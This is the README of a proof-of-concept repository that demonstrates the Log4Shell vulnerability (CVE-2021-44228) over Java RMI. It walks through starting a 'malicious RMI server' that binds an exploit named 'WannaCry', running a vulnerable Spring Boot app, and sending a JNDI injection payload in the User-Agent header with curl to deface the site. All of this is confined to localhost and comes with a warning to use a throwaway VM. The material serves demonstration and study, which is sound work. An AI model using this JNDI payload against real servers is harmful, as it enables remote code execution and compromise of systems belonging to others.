# Demonstration of the Log4jShell Exploit

This code may contain malware and is known to contain vulnerabilities. 

Use at your own risk - if you use it, be advised to do that in a VM  - discard the VM after use.

# log4shell-rmi-poc

A Proof of Concept of the Log4j vulnerability (CVE-2021-44228) over Java-RMI
It uses Log4j 2.5.7 from spring-boot-starter-log4j2

## Requirements:

Tested with Java 8 (JDK 1.8.0_25), Java 11 (JDK 11.0.1) and Java 19 (openjdk 19.0.2)

## How to run the POC

### 1. Clone the repo:

```bash
git clone https://github.com/Labout/log4shell-rmi-poc.git
```

### 2. Start the attacker RMI Server

```bash
cd log4jshell-rmi-server
./startRmiServer.sh 
```

You should get something like this:

```
a target/classes/static
a target/classes/static/index.html
a target/classes/static/img
a target/classes/static/img/wc.png
Starting malicious RMI Server
Creating evil RMI registry on port 1099
Bind remote exploit to 'WannaCry'
```

### 3. Start the vulnerable Log4j application (a simple spring boot application)

In a new Terminal 

```bash
cd vulnerable-log4j-app
./startVulnerableService.sh
```

### 4. Show the original site (a dummy web-site)

```bash
open http://localhost:8080
```

The original website is opened in your browser.


### 5. Inject a vulnerable JNDI over the "User-Agent" header 

```bash
curl http://localhost:8080/hello --header 'User-Agent: ${jndi:rmi://127.0.0.1:1099/WannaCry}'
```

The website gets updated with the data provided from malicious RMI server that has been started in the first step.

> [!NOTE]
> To protect against real exploitation, this must be done from a client located at 127.0.0.1.

### 6. Show the now hacked site

```bash
open http://localhost:8080
```

(or just shift-reload in your browser). The hacked website is returned.

## References 

* https://www.cisecurity.org/log4j-zero-day-vulnerability-response/
* https://www.lunasec.io/docs/blog/log4j-zero-day/
